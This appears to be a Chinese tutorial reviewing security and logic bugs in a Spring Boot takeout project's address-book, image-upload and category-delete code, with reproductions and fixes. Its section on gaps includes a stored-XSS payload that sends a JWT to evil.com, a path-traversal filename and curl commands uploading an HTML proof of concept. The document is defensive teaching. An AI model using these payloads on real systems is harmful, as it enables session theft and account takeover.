## ① 场景

三块看起来最"没技术含量"的代码，但每块都有一个真实的漏洞：

| 功能 | 接口 | 坑在哪 |
|---|---|---|
| 地址簿 | `POST/PUT/DELETE /user/addressBook` | **能产生两个默认地址**，之后查默认地址直接 500 |
| 图片上传 | `POST /admin/common/upload` | **不限文件类型**，能传 `.html` 并让它以 `text/html` 执行 |
| 分类删除 | `DELETE /admin/category?id=` | 有前置校验（这块反而是对的），但缺事务 |

**为什么单独讲这三个？** 因为面试官常问"你这个项目有什么安全问题"，大部分人只会说"我用了 JWT"。能说出这三个具体问题的，说明真的把代码过了一遍。

## ③ 逐行拆

### 地址簿 · `setDefault`：为什么是两条 UPDATE

```java
@Transactional
public void setDefault(Long id) {
    Long userId = BaseContext.getCurrentId();
    clearDefault(userId);          // ① 把所有默认清成 0

    AddressBook addressBook = new AddressBook();
    addressBook.setId(id);
    addressBook.setIsDefault(1);
    addressBookMapper.updateById(addressBook);   // ② 把目标设成 1
}

private void clearDefault(Long userId) {
    AddressBook update = new AddressBook();
    update.setIsDefault(0);
    addressBookMapper.update(update, Wrappers.<AddressBook>lambdaUpdate()
            .eq(AddressBook::getUserId, userId)
            .eq(AddressBook::getIsDefault, 1));
}
```

**"先全清、再设一个"，是最简单可靠的"唯一性"实现。**

另一种思路是"只把旧的那个清掉"：

```sql
UPDATE address_book SET is_default=0 WHERE user_id=? AND is_default=1 AND id != ?
```

**看起来更精准，但更脆弱** —— 它假设"当前确实只有一个默认"。如果数据已经脏了（有两个默认），这种写法只会清掉一个，问题依然存在。

**"全清 + 设一个"是幂等的**：不管之前有几个默认，执行完都只有一个。

**代价**：多一次 UPDATE。但这个操作频率极低（用户偶尔切地址），无所谓。

**`clearDefault` 里用的是 `update(entity, wrapper)` 而不是 `updateById`：**

```java
AddressBook update = new AddressBook();
update.setIsDefault(0);          // 只设要改的字段
addressBookMapper.update(update, wrapper);   // WHERE 由 wrapper 给
```

生成的 SQL 是 `UPDATE address_book SET is_default=0 WHERE (user_id=? AND is_default=1)` —— **只改一列，条件由 wrapper 拼**。

**这是"按条件批量更新"的标准写法**：实体负责 `SET`，wrapper 负责 `WHERE`。

### 地址簿 · `add`：为什么也要 clearDefault

```java
if (Integer.valueOf(1).equals(addressBook.getIsDefault())) {
    clearDefault(userId);
}
addressBookMapper.insert(addressBook);
```

新增地址时，如果前端勾了"设为默认"，要先清掉旧的默认，再插入新行。否则又是两个默认。

**`Integer.valueOf(1).equals(...)` 而不是 `addressBook.getIsDefault() == 1`**：

`isDefault` 是 `Integer`，`== 1` 在值 ≤ 127 时因为缓存池能正常工作，**但超过 127 就变成比较引用**，永远 false。虽然 `is_default` 只会是 0 或 1，不会踩到，但这个写法本身是隐患。

**"包装类型比较永远用 `equals`"** —— 这是 Java 的基本功。

### 地址簿 · `list` 排序

```java
return addressBookMapper.selectList(Wrappers.<AddressBook>lambdaQuery()
        .eq(AddressBook::getUserId, userId)
        .orderByDesc(AddressBook::getIsDefault));
```

`ORDER BY is_default DESC` —— 默认地址排最前面。

**注意：没有第二排序键。** 两个 `is_default=0` 的地址之间顺序不确定（依赖执行计划）。要稳定的话应该加 `orderByDesc(createTime)` 或 `orderByAsc(id)`。

**这是"分页/列表查询没有确定性排序"的同类问题**（精讲 11 提过）。

### 图片上传 · 扩展名怎么取

```java
String originalName = file.getOriginalFilename();
String ext = "";
if (originalName != null && originalName.lastIndexOf('.') >= 0) {
    ext = originalName.substring(originalName.lastIndexOf('.'));
}
```

**只取最后一个 `.` 之后的部分，包括那个点**（所以 `ext` 是 `.jpg` 而不是 `jpg`）。

**为什么不直接用原文件名？** 注释写了："原文件名不信任（可能含路径穿越字符）"。

**路径穿越攻击长这样**：

```
原始文件名：../../../../etc/passwd
如果直接用它拼路径：new File(dir, "../../.../passwd")
→ 写到 upload 目录外面去了
```

**这个项目通过"UUID 重命名"彻底绕开了** —— 文件名里不再有任何用户输入的字符，只有 UUID + 扩展名。

**但扩展名本身还是用户输入的**，这就留了漏洞（见第 ⑦ 层）。

### 图片上传 · UUID 重命名

```java
String newName = UUID.randomUUID().toString().replace("-", "") + ext;
```

**三个作用：**

1. **防同名覆盖**：两个用户都传 `avatar.jpg`，不会互相覆盖
2. **防路径穿越**：文件名不含用户输入
3. **防枚举**：文件名不可预测，不能遍历 `/images/1.jpg`、`2.jpg`

**`.replace("-", "")` 去掉 UUID 里的横线**，得到 32 位十六进制。纯粹为了好看，不影响唯一性。

### 图片上传 · `getAbsoluteFile()` 这一行不能省

```java
file.transferTo(new File(dir, newName).getAbsoluteFile());
```

**`getAbsoluteFile()` 是非常关键的一行，很多人踩过这个坑。**

`MultipartFile.transferTo(File dest)` 在 Spring 的实现里：

```java
// StandardMultipartFile.transferTo 简化版
if (!dest.isAbsolute()) {
    // 相对路径会被解析到临时目录下！
    dest = new File(System.getProperty("java.io.tmpdir"), dest.getPath());
}
```

**如果你传的是相对路径**（比如 `new File("upload/" + name)`），文件会被写到 **Tomcat 的临时目录**，不是项目目录。表现为"上传成功但访问 404"。

**`getAbsoluteFile()` 把相对路径转成绝对路径，绕开了这个转换。**

**这个坑的排查成本很高**，因为接口返回的是成功，文件也确实存在（在临时目录里），只是访问不到。

### 分类删除 · 两段前置校验

```java
public void deleteById(Long id) {
    Long dishCount = dishMapper.selectCount(
            Wrappers.<Dish>lambdaQuery().eq(Dish::getCategoryId, id));
    if (dishCount != null && dishCount > 0) {
        throw new BaseException(MessageConstant.CATEGORY_BE_RELATED_BY_DISH);
    }

    Long setmealCount = setmealMapper.selectCount(
            Wrappers.<Setmeal>lambdaQuery().eq(Setmeal::getCategoryId, id));
    if (setmealCount != null && setmealCount > 0) {
        throw new BaseException(MessageConstant.CATEGORY_BE_RELATED_BY_SETMEAL);
    }

    categoryMapper.deleteById(id);
}
```

**业务规则：分类下有菜品或套餐，都不许删。**

这和精讲 06 的"起售中的菜品不能删"是同一个思路：**删除前先检查引用，避免产生孤儿数据**。

**注意这是"短路校验"**：第一个条件是"有菜品"就先抛，根本不会去查套餐。

第 ④ 层的 SQL 能证明这一点 —— 只有一条 `SELECT COUNT dish`，没有 `SELECT COUNT setmeal`。

**这个写法是对的**（两条都查是浪费），但也意味着报错信息只告诉你"有关联菜品"，即使套餐也有。

## ④ SQL 实况（真实抓取）

### 场景 A：新增地址并设为默认（clearDefault + insert）

```sql
UPDATE address_book SET is_default=0 WHERE (user_id = 4 AND is_default = 1)

INSERT INTO address_book ( user_id, consignee, sex, phone, province_code, province_name,
                           city_code, city_name, district_code, district_name, detail, label, is_default )
VALUES ( 4, '李四', '0', '13900139000', '110000', '北京市', '110100', '北京市',
         '110101', '东城区', 'YY路2号', '家', 1 )
```

**两条 SQL：先清旧默认，再插新的。**

**注意 `INSERT` 里没有 `create_time`。** 和精讲 12 的规律一致 —— `AddressBook` 实体没标 `@TableField(fill=...)`。

### 场景 B：`setDefault` —— 两条 UPDATE，顺序不能反

```sql
UPDATE address_book SET is_default=0 WHERE (user_id = 4 AND is_default = 1)
UPDATE address_book SET is_default=1 WHERE id=3
```

**这就是"唯一默认"的实现：先全清，再设一个。**

**如果顺序反了会怎样？** 先把 id=3 设成 1，再"清掉所有 is_default=1 的"—— 会把刚才设的那条也清掉，结果一个默认都没有。

**这个顺序错误极其隐蔽**：代码看起来两行都执行了，但最终状态是"没有默认地址"，用户下单时会提示"请选择地址"。

### 场景 C：删除有关联菜品的分类 —— 只查了一张表

```sql
SELECT COUNT( * ) AS total FROM dish WHERE (category_id = 3)
```

响应：`{"code":0,"msg":"当前分类关联了菜品,不能删除"}`

**只有一条 SQL，没有 `SELECT COUNT setmeal`。**

这就是"短路校验"的证据：第一个条件命中就直接抛异常，后面的检查不执行。

### 场景 D：图片上传 —— 没有 SQL

上传是纯文件 IO，不碰数据库。但**它返回的路径可以直接访问**，这一点是下面第 ⑦ 层漏洞的基础：

```bash
# 上传 README.md
curl -X POST ".../admin/common/upload" -H "token: $AT" -F "file=@README.md;filename=readme.md"
→ {"code":1,"data":"/images/07caf69526f742b89878f2f869ef3657.md"}

# 磁盘上确实多了这个文件
-rw-r--r-- 1 17640 197609 2425 07caf69526f742b89878f2f869ef3657.md

# 通过 URL 能访问
curl -o /dev/null -w "%{http_code} %{content_type}" "http://localhost:8080/images/07caf...md"
→ 200 application/octet-stream
```

**一个 `.md` 文件被当成图片收下了。**

## ⑤ 权衡

### `setDefault` 为什么不用"只清单个"，而用"全清 + 设一个"？

前面分析过：**全清是幂等的**，不管之前有几个默认，执行完都是"只有一个"。

| | 全清 + 设一个（当前） | 只清单个 |
|---|---|---|
| SQL 数 | 2 | 2 |
| 数据已脏（两个默认）时 | **能修正** | 只能清掉一个，问题保留 |
| 幂等 | 是 | 否 |
| 并发安全 | 一般（见 ⑦） | 更差 |

**"用幂等的操作，而不是精确的操作"** —— 这是处理"唯一性"类需求的通用原则。

同类例子：`git reset --hard` 比"手工撤销每个改动"可靠。

### 为什么不给 `address_book` 加"唯一索引"来保证只有一个默认？

```sql
-- 想这么写，但 MySQL 不支持"部分索引"（带 WHERE 的唯一索引）
CREATE UNIQUE INDEX uk_user_default ON address_book (user_id) WHERE is_default = 1;
```

**MySQL 不支持部分索引（PostgreSQL 支持）。**

MySQL 的替代方案：

1. **生成列 + 唯一索引**（MySQL 5.7+）：
```sql
ALTER TABLE address_book
  ADD COLUMN default_flag BIGINT GENERATED ALWAYS AS (IF(is_default=1, user_id, NULL)) STORED,
  ADD UNIQUE INDEX uk_user_default (default_flag);
```
原理：`is_default=1` 时生成列等于 `user_id`（唯一），`is_default=0` 时等于 `NULL`（唯一索引允许多个 NULL）。**很巧妙，但很绕。**

2. **业务层保证**（当前做法）：靠 `@Transactional` + 先清后设。

**这个项目选了 2，够用。** 但如果哪天出现"两个默认"的脏数据，只有 1 能兜住。

**面试如果被问"怎么保证一个用户只有一个默认地址"，答"业务层用事务 + 先清后设，因为 MySQL 没有部分索引；如果要数据库级兜底，可以用生成列 + 唯一索引"** —— 这个回答能直接区分出"想过"和"没想过"。

### 上传为什么存在本地磁盘，而不是 OSS？

```java
@Value("${sky.file.upload-dir}")
private String uploadDir;   // E:/project/sky-take-out/upload
```

注释里写了："生产环境通常走 OSS（阿里云/腾讯云），这里用本地磁盘演示"。

**本地磁盘的三个问题：**

1. **多实例不共享**：部署 2 台服务器，A 机传的图片，B 机访问不到（除非挂共享盘）
2. **不能水平扩容**：磁盘满了就传不上去
3. **没有 CDN**：所有图片请求打到应用服务器

**OSS 方案**：上传时直接传到 OSS，返回 URL；或者"服务端中转上传"（浏览器 → 你的服务器 → OSS）。

**面试被问"图片存储怎么设计"，答"开发用本地磁盘方便调试，生产应该用对象存储 + CDN；如果用本地磁盘，至少要用共享存储（NFS）并配独立域名"** —— 这是标准答案。

## ⑥ 踩坑实录

### 坑 1（实测复现）：能造出两个默认地址，然后查询直接 500

这是我这次实测**真的复现出来**的：

**第 1 步**：新增地址 4，设为默认。经过 `clearDefault` 后，只有 4 是默认。

```json
[{"id":4,"isDefault":1}, {"id":3,"isDefault":0}]
```

**第 2 步**：用「**修改**」接口把地址 3 也设成默认：

```bash
curl -X PUT .../user/addressBook -d '{"id":3, "consignee":"张三", ..., "isDefault":1}'
```

返回 `{"code":1}` 成功。

**第 3 步**：查数据库：

```
id  consignee  is_default
3   张三       1
4   李四       1        ← 两个默认！
```

**第 4 步**：查默认地址接口：

```bash
curl .../user/addressBook/default
→ {"code":0,"msg":"未知错误"}
```

**日志里的真实异常：**

```
org.apache.ibatis.exceptions.TooManyResultsException:
Expected one result (or null) to be returned by selectOne(), but found: 2
    at com.baomidou.mybatisplus.core.mapper.BaseMapper.selectOne(BaseMapper.java:228)
```

**根因链：**

```
AddressBookServiceImpl.update() 没有调 clearDefault
  → 两个 is_default=1
  → getDefault() 用 selectOne
  → selectOne 期望 0 或 1 条，查到 2 条
  → TooManyResultsException（RuntimeException）
  → GlobalExceptionHandler 兜底成 "未知错误"
```

**三个层次的问题：**

1. **`update()` 不维护"默认地址唯一"这个不变量** —— `add()` 和 `setDefault()` 都维护了，唯独 `update()` 漏了。
2. **`selectOne` 用在"逻辑上应该唯一、但数据库没有唯一约束"的列上** —— 数据一脏就抛异常。
3. **异常被兜底成"未知错误"** —— `TooManyResultsException` 不在业务异常体系里，用户完全不知道发生了什么。

**修法（三层）：**

```java
// ① update 里也维护不变量
public void update(AddressBookDTO dto) {
    if (Integer.valueOf(1).equals(dto.getIsDefault())) {
        clearDefault(BaseContext.getCurrentId());
    }
    ...
}

// ② 或者更彻底：update 不允许改 isDefault，只允许通过 setDefault 改
addressBook.setIsDefault(null);   // NOT_NULL 策略下就不会被更新

// ③ getDefault 用 selectList 取第一条，不抛异常
List<AddressBook> list = addressBookMapper.selectList(...);
return list.isEmpty() ? null : list.get(0);
```

**推荐 ② + ③ 组合**：从接口层面禁止绕过 `setDefault`，查询层面也不因脏数据崩溃。

**这个 bug 的价值**：它完美展示了"同一个不变量，有的入口维护了、有的没有"这类问题 —— **而这类问题靠读单个方法永远发现不了，必须把所有写入口列出来对照。**

### 坑 2：`transferTo` 用相对路径，文件写到临时目录

前面提过 `getAbsoluteFile()` 的作用。补充一下**这个坑的典型表现**：

```
1. 上传接口返回成功，路径是 /images/xxx.jpg
2. 文件确实存在（用 find 能找到，但在 %TEMP% 目录下）
3. 浏览器访问 /images/xxx.jpg → 404
```

**排查时容易怀疑"静态资源映射配错了"**，其实映射是对的，只是文件压根不在那个目录。

**判断方法**：上传后直接在目标目录 `ls`，看文件在不在。

**这个项目的 `uploadDir` 配的是绝对路径**（`E:/project/sky-take-out/upload`），所以 `new File(dir, newName)` 本身就是绝对的，`getAbsoluteFile()` 只是双保险。**但如果有人把它改成相对路径（比如 `./upload`），没有 `getAbsoluteFile()` 就会出问题。**

### 坑 3：404 也被兜成"未知错误"

调错接口路径时（`PUT /user/addressBook/default/3`，多了个路径段），返回的是：

```json
{"code":0,"msg":"未知错误"}
```

**预期应该是 404**，但因为 `GlobalExceptionHandler` 里那个 `@ExceptionHandler(Exception.class)` 把 `NoHandlerFoundException` 也接住了，统一返回"未知错误"。

**这会让所有"路径写错"的问题看起来像"服务端 bug"。**

**改进**：单独 catch 掉

```java
@ExceptionHandler(NoHandlerFoundException.class)
public Result<String> handleNotFound(NoHandlerFoundException ex) {
    return Result.error("接口不存在: " + ex.getRequestURL());
}
```

（注意还要在 yml 里配 `spring.mvc.throw-exception-if-no-handler-found: true` 和 `spring.web.resources.add-mappings: false`，否则 Boot 3 默认不抛这个异常。）

## ⑦ 缺口

### 缺口 1（实测）：上传不限文件类型 → 存储型 XSS

```java
String ext = originalName.substring(originalName.lastIndexOf('.'));
String newName = UUID.randomUUID().toString().replace("-", "") + ext;
```

**只保留扩展名，不校验它是什么。** 任何人可以传 `.html`、`.svg`、`.js`。

**我实测了 `.html`：**

```bash
# 上传（把项目里的 index.html 当样本）
curl -X POST ".../admin/common/upload" -H "token: $AT" -F "file=@index.html;filename=poc.html"
→ {"code":1,"data":"/images/9ee9f57e41284636bdb9046fbac296ae.html"}

# 访问
curl -D - "http://localhost:8080/images/9ee9f57e...html"
→ HTTP/1.1 200
   Content-Type: text/html          ← 关键！

# 内容
<!DOCTYPE html>
<html lang="zh-CN">
...
```

**`Content-Type: text/html` 意味着浏览器会把它当网页渲染并执行里面的 JS。**

**攻击场景：**

```
1. 攻击者（有管理端账号，或者社交工程让运营上传）上传 poc.html
   内容：<script>fetch('https://evil.com/steal?c='+localStorage.getItem('token'))</script>

2. 得到一个 URL：http://你的域名/images/9ee9f57e....html

3. 把这个链接发给管理员/用户，诱导点击

4. 同源！→ 页面能读到 localStorage 里的 JWT → 发到攻击者服务器 → 账号被盗
```

**这是"存储型 XSS"，而且是同源，危害比普通反射型大得多**（精讲 04 讲过 token 存在 `localStorage`）。

**修法（三层，缺一不可）：**

```java
// ① 白名单校验扩展名
private static final Set<String> ALLOWED = Set.of(".jpg", ".jpeg", ".png", ".gif", ".webp");
if (!ALLOWED.contains(ext.toLowerCase())) {
    return Result.error("只允许上传图片");
}

// ② 校验真实内容（不信扩展名，读文件头魔数）
//    JPEG: FF D8 FF    PNG: 89 50 4E 47    GIF: 47 49 46 38
String magic = readMagic(file);
if (!isImageMagic(magic)) {
    return Result.error("文件内容不是图片");
}

// ③ 响应头禁止嗅探/执行
//    在静态资源响应上加 X-Content-Type-Options: nosniff
```

**第 ② 层最关键**：攻击者可以把 `poc.html` 改名成 `poc.jpg`，绕过扩展名白名单。**只有校验文件头魔数才可靠。**

**第 ③ 层是"即使前两层被绕过"的兜底**：`nosniff` 让浏览器严格按 `Content-Type` 处理，不猜类型。

**面试如果被问"文件上传怎么防攻击"，能答出"扩展名白名单 + 文件头校验 + 随机文件名 + nosniff + 独立域名"这五条，就是完整答案。**

### 缺口 2（实测）：地址簿的 `update` / `delete` 没有归属校验

```java
public void update(AddressBookDTO addressBookDTO) {
    AddressBook addressBook = new AddressBook();
    BeanUtils.copyProperties(addressBookDTO, addressBook);   // ← id 也拷进来了
    addressBookMapper.updateById(addressBook);               // ← 只按 id 更新，没判 user_id
}

public void delete(Long id) {
    addressBookMapper.deleteById(id);                        // ← 只按 id 删，没判 user_id
}
```

**A 用户传 B 用户的地址 id，就能改/删别人的地址。**

**为什么这个比"两个默认地址"更严重？**

- 两个默认地址 → 功能异常，用户抱怨
- 越权改地址 → **A 用户可以把 B 用户的收货地址改成自己的地址**，B 用户下单时外卖送到 A 家

**这是数据泄露 + 业务事故的组合。**

**修法：**

```java
public void update(AddressBookDTO dto) {
    AddressBook db = addressBookMapper.selectById(dto.getId());
    if (db == null || !db.getUserId().equals(BaseContext.getCurrentId())) {
        throw new BaseException("地址不存在");
    }
    ...
}

public void delete(Long id) {
    addressBookMapper.delete(Wrappers.<AddressBook>lambdaQuery()
            .eq(AddressBook::getId, id)
            .eq(AddressBook::getUserId, BaseContext.getCurrentId()));   // 条件里带上 userId
}
```

**`delete` 的写法更优雅：把 `user_id` 塞进 `WHERE`，一条 SQL 同时完成"校验 + 删除"。** 删到 0 行就说明"不存在或不属于你"。

**注意精讲 02 里 `submitOrder` 是做了归属校验的**（`!addressBook.getUserId().equals(userId)`）。**同一个项目里有的地方做了、有的漏了 —— 这是真实工程的常态，也是面试时最能体现"我认真读过自己代码"的点。**

### 缺口 3：其他

| 缺口 | 严重度 | 说明 | 怎么改 |
|---|---|---|---|
| **`update` 能绕过 `setDefault`** | **高** | 造出两个默认地址，之后查默认直接 500（已复现） | update 里禁止改 isDefault |
| **上传无大小校验（业务层）** | 中 | 只靠 `multipart.max-file-size: 10MB` 兜底 | 业务层再判一次，给友好提示 |
| **上传文件永不清理** | 中 | 用户换头像后，旧文件永远留在磁盘 | 定时任务清理孤儿文件 |
| **分类删除没有事务** | 低 | 两次 `SELECT COUNT` 和一次 `DELETE` 之间，可能有人新增了菜品 | 加 `@Transactional`（虽然 MySQL 的 RR 隔离级别下意义有限） |
| **`list()` 排序不确定** | 低 | 只按 `is_default DESC`，同值时顺序不定 | 加第二排序键 `id DESC` |
| **地址簿没有数量上限** | 低 | 可以加几百个地址 | 限制最多 20 个 |
| **上传接口只有 admin 能调** | — | `/admin/common/**` 走管理端鉴权，这点是对的 | — |

## ⑧ 面试 30 秒版

> 这三块小功能我都实测出了具体问题，可以讲三个。
>
> **第一，默认地址唯一性没维护住。** `add` 和 `setDefault` 都会先 `clearDefault` 再设，`setDefault` 是"全清 + 设一个"两条 UPDATE 保证幂等。但 `update` 接口直接 `updateById`，没走 `clearDefault`，所以能造出两个默认地址。我实测复现了：造出两个默认后再查 `/addressBook/default`，`selectOne` 命中两条，抛 `TooManyResultsException`，被兜底成"未知错误"。根因是"同一个不变量，三个写入口只维护了两个"。
>
> **第二，地址簿的 `update`/`delete` 没有归属校验**，A 用户传 B 的地址 id 就能改删。`submitOrder` 里做了归属判断，这两个接口漏了 —— 这就是为什么"按 id 操作"必须配 `eq(user_id, currentUserId)`。
>
> **第三，图片上传不限文件类型。** 只做了 UUID 重命名防路径穿越，但扩展名是用户给的。我实测上传了一个 `.html`，访问时返回 `Content-Type: text/html` 并渲染，这就是同源存储型 XSS，能读走 localStorage 里的 JWT。修法是扩展名白名单 + 文件头魔数校验 + 随机文件名 + `X-Content-Type-Options: nosniff`，生产上还应该放独立域名。
>
> 另外上传那里有个细节：`transferTo` 必须传绝对路径（`getAbsoluteFile()`），否则 Spring 会把它解析到临时目录，表现为"上传成功但访问 404"。
